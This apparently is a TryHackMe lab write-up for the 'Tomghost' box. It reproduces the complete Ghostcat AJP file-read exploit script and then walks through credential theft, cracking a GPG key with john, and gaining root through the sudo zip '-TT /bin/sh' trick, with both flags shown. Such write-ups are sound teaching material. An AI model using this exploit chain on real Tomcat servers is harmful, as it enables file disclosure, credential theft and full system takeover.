---
tags:
title: Tomghost - Easy (THM)
permalink: /Tomghost-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
rustscan --addresses "10.65.148.47" --top
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Because guessing isn't hacking.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 20380'.
Open 10.65.148.47:22
Open 10.65.148.47:53
Open 10.65.148.47:8009
Open 10.65.148.47:8080
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-17 19:56 -03
Initiating Ping Scan at 19:56
Scanning 10.65.148.47 [4 ports]
Completed Ping Scan at 19:56, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:56
Completed Parallel DNS resolution of 1 host. at 19:56, 0.09s elapsed
DNS resolution of 1 IPs took 0.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:56
Scanning 10.65.148.47 [4 ports]
Discovered open port 22/tcp on 10.65.148.47
Discovered open port 8080/tcp on 10.65.148.47
Discovered open port 8009/tcp on 10.65.148.47
Discovered open port 53/tcp on 10.65.148.47
Completed SYN Stealth Scan at 19:56, 0.19s elapsed (4 total ports)
Nmap scan report for 10.65.148.47
Host is up, received reset ttl 63 (0.077s latency).
Scanned at 2026-04-17 19:56:53 -03 for 0s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
53/tcp   open  domain     syn-ack ttl 63
8009/tcp open  ajp13      syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
           Raw packets sent: 8 (328B) | Rcvd: 16 (644B)
```

![[Pasted image 20260417195730.png]]

![[Pasted image 20260417195742.png]]

```bash
[Apr 17, 2026 - 20:03:41 (-03)] exegol-thm Tomghost # searchsploit tom ghost
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Me | multiple/webapps/49039.rb
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion      | multiple/webapps/48143.py
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```python
#!/usr/bin/env python
#CNVD-2020-10487  Tomcat-Ajp lfi
#by ydhcui
import struct

# Some references:
# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
def pack_string(s):
        if s is None:
                return struct.pack(">h", -1)
        l = len(s)
        return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)
def unpack(stream, fmt):
        size = struct.calcsize(fmt)
        buf = stream.read(size)
        return struct.unpack(fmt, buf)
def unpack_string(stream):
        size, = unpack(stream, ">h")
        if size == -1: # null string
                return None
        res, = unpack(stream, "%ds" % size)
        stream.read(1) # \0
        return res
class NotFoundException(Exception):
        pass
class AjpBodyRequest(object):
        # server == web server, container == servlet
        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
        MAX_REQUEST_LENGTH = 8186
        def __init__(self, data_stream, data_len, data_direction=None):
                self.data_stream = data_stream
                self.data_len = data_len
                self.data_direction = data_direction
        def serialize(self):
                data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
                if len(data) == 0:
                        return struct.pack(">bbH", 0x12, 0x34, 0x00)
                else:
                        res = struct.pack(">H", len(data))
                        res += data
                if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
                        header = struct.pack(">bbH", 0x12, 0x34, len(res))
                else:
                        header = struct.pack(">bbH", 0x41, 0x42, len(res))
                return header + res
        def send_and_receive(self, socket, stream):
                while True:
                        data = self.serialize()
                        socket.send(data)
                        r = AjpResponse.receive(stream)
                        while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
                                r = AjpResponse.receive(stream)

                        if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
                                break
class AjpForwardRequest(object):
        _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)
        REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}
        # server == web server, container == servlet
        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
        COMMON_HEADERS = ["SC_REQ_ACCEPT",
                "SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION",
                "SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",
                "SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"
        ]
        ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]
        def __init__(self, data_direction=None):
                self.prefix_code = 0x02
                self.method = None
                self.protocol = None
                self.req_uri = None
                self.remote_addr = None
                self.remote_host = None
                self.server_name = None
                self.server_port = None
                self.is_ssl = None
                self.num_headers = None
                self.request_headers = None
                self.attributes = None
                self.data_direction = data_direction
        def pack_headers(self):
                self.num_headers = len(self.request_headers)
                res = ""
                res = struct.pack(">h", self.num_headers)
                for h_name in self.request_headers:
                        if h_name.startswith("SC_REQ"):
                                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1
                                res += struct.pack("BB", 0xA0, code)
                        else:
                                res += pack_string(h_name)

                        res += pack_string(self.request_headers[h_name])
                return res

        def pack_attributes(self):
                res = b""
                for attr in self.attributes:
                        a_name = attr['name']
                        code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1
                        res += struct.pack("b", code)
                        if a_name == "req_attribute":
                                aa_name, a_value = attr['value']
                                res += pack_string(aa_name)
                                res += pack_string(a_value)
                        else:
                                res += pack_string(attr['value'])
                res += struct.pack("B", 0xFF)
                return res
        def serialize(self):
                res = ""
                res = struct.pack("bb", self.prefix_code, self.method)
                res += pack_string(self.protocol)
                res += pack_string(self.req_uri)
                res += pack_string(self.remote_addr)
                res += pack_string(self.remote_host)
                res += pack_string(self.server_name)
                res += struct.pack(">h", self.server_port)
                res += struct.pack("?", self.is_ssl)
                res += self.pack_headers()
                res += self.pack_attributes()
                if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:
                        header = struct.pack(">bbh", 0x12, 0x34, len(res))
                else:
                        header = struct.pack(">bbh", 0x41, 0x42, len(res))
                return header + res
        def parse(self, raw_packet):
                stream = StringIO(raw_packet)
                self.magic1, self.magic2, data_len = unpack(stream, "bbH")
                self.prefix_code, self.method = unpack(stream, "bb")
                self.protocol = unpack_string(stream)
                self.req_uri = unpack_string(stream)
                self.remote_addr = unpack_string(stream)
                self.remote_host = unpack_string(stream)
                self.server_name = unpack_string(stream)
                self.server_port = unpack(stream, ">h")
                self.is_ssl = unpack(stream, "?")
                self.num_headers, = unpack(stream, ">H")
                self.request_headers = {}
                for i in range(self.num_headers):
                        code, = unpack(stream, ">H")
                        if code > 0xA000:
                                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]
                        else:
                                h_name = unpack(stream, "%ds" % code)
                                stream.read(1) # \0
                        h_value = unpack_string(stream)
                        self.request_headers[h_name] = h_value
        def send_and_receive(self, socket, stream, save_cookies=False):
                res = []
                i = socket.sendall(self.serialize())
                if self.method == AjpForwardRequest.POST:
                        return res

                r = AjpResponse.receive(stream)
                assert r.prefix_code == AjpResponse.SEND_HEADERS
                res.append(r)
                if save_cookies and 'Set-Cookie' in r.response_headers:
                        self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']

                # read body chunks and end response packets
                while True:
                        r = AjpResponse.receive(stream)
                        res.append(r)
                        if r.prefix_code == AjpResponse.END_RESPONSE:
                                break
                        elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
                                continue
                        else:
                                raise NotImplementedError
                                break

                return res

class AjpResponse(object):
        _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)
        COMMON_SEND_HEADERS = [
                        "Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
                        "Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
                        ]
        def parse(self, stream):
                # read headers
                self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")

                if self.prefix_code == AjpResponse.SEND_HEADERS:
                        self.parse_send_headers(stream)
                elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
                        self.parse_send_body_chunk(stream)
                elif self.prefix_code == AjpResponse.END_RESPONSE:
                        self.parse_end_response(stream)
                elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
                        self.parse_get_body_chunk(stream)
                else:
                        raise NotImplementedError

        def parse_send_headers(self, stream):
                self.http_status_code, = unpack(stream, ">H")
                self.http_status_msg = unpack_string(stream)
                self.num_headers, = unpack(stream, ">H")
                self.response_headers = {}
                for i in range(self.num_headers):
                        code, = unpack(stream, ">H")
                        if code <= 0xA000: # custom header
                                h_name, = unpack(stream, "%ds" % code)
                                stream.read(1) # \0
                                h_value = unpack_string(stream)
                        else:
                                h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]
                                h_value = unpack_string(stream)
                        self.response_headers[h_name] = h_value

        def parse_send_body_chunk(self, stream):
                self.data_length, = unpack(stream, ">H")
                self.data = stream.read(self.data_length+1)

        def parse_end_response(self, stream):
                self.reuse, = unpack(stream, "b")

        def parse_get_body_chunk(self, stream):
                rlen, = unpack(stream, ">H")
                return rlen

        @staticmethod
        def receive(stream):
                r = AjpResponse()
                r.parse(stream)
                return r

import socket

def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
        fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
        fr.method = method
        fr.protocol = "HTTP/1.1"
        fr.req_uri = req_uri
        fr.remote_addr = target_host
        fr.remote_host = None
        fr.server_name = target_host
        fr.server_port = 80
        fr.request_headers = {
                'SC_REQ_ACCEPT': 'text/html',
                'SC_REQ_CONNECTION': 'keep-alive',
                'SC_REQ_CONTENT_LENGTH': '0',
                'SC_REQ_HOST': target_host,
                'SC_REQ_USER_AGENT': 'Mozilla',
                'Accept-Encoding': 'gzip, deflate, sdch',
                'Accept-Language': 'en-US,en;q=0.5',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'
        }
        fr.is_ssl = False
        fr.attributes = []
        return fr

class Tomcat(object):
        def __init__(self, target_host, target_port):
                self.target_host = target_host
                self.target_port = target_port

                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket.connect((target_host, target_port))
                self.stream = self.socket.makefile("rb", buffering=0)

        def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
                self.req_uri = req_uri
                self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
                print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
                if user is not None and password is not None:
                        self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
                for h in headers:
                        self.forward_request.request_headers[h] = headers[h]
                for a in attributes:
                        self.forward_request.attributes.append(a)
                responses = self.forward_request.send_and_receive(self.socket, self.stream)
                if len(responses) == 0:
                        return None, None
                snd_hdrs_res = responses[0]
                data_res = responses[1:-1]
                if len(data_res) == 0:
                        print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
                return snd_hdrs_res, data_res

'''
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
'''

import argparse
parser = argparse.ArgumentParser()
parser.add_argument("target", type=str, help="Hostname or IP to attack")
parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
args = parser.parse_args()
t = Tomcat(args.target, args.port)
_,data = t.perform_request('/asdf',attributes=[
    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
    {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
    ])
print('----------------------------')
print(b"".join([d.data for d in data]).decode("utf-8", errors="ignore"))
```


```bash
python3 exploit.py 10.65.148.47 -p 8009 -f WEB-INF/web.xml
Getting resource at ajp13://10.65.148.47:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

```bash
ssh skyfuck@tomghost.thm
The authenticity of host 'tomghost.thm (10.65.148.47)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'tomghost.thm' (ED25519) to the list of known hosts.
skyfuck@tomghost.thm's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ cat su
cat: su: No such file or directory
skyfuck@ubuntu:~$ cat us
cat: us: No such file or directory
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

```bash
 scp skyfuck@tomghost.thm:/home/skyfuck/credential.pgp ./credential.pgp
skyfuck@tomghost.thm's password:
credential.pgp                                         100%  394     1.1KB/s   00:00
[Apr 17, 2026 - 20:10:31 (-03)] exegol-thm Tomghost # scp skyfuck@tomghost.thm:/home/skyfuck/tryhackme.asc ./tryhackme.asc
skyfuck@tomghost.thm's password:
tryhackme.asc                                          100% 5144    14.3KB/s   00:00
```

```bash
gpg2john tryhackme.asc > hash_to_crack

File tryhackme.asc
[Apr 17, 2026 - 20:11:56 (-03)] exegol-thm Tomghost # ls
credential.pgp  exploit.py  hash_to_crack  tryhackme.asc  zsln.php
[Apr 17, 2026 - 20:11:59 (-03)] exegol-thm Tomghost # cat hash_to_crack
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

```bash
 j hash_to_crack
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2026-04-17 20:12) 33.33g/s 42666p/s 42666c/s 42666C/s marie1..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
gpg --import tryhackme.asc
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

```bash
gpg --decrypt credential.pgp
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j#
```

```bash
skyfuck@ubuntu:~$ su merlin
Password:
merlin@ubuntu:/home/skyfuck$
```

```bash
cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

```bash
merlin@ubuntu:~$ sudo /usr/bin/zip /tmp/ /etc/hosts -T -TT '/bin/sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
# cat root.txt THM{Z1P_1S_FAKE}
```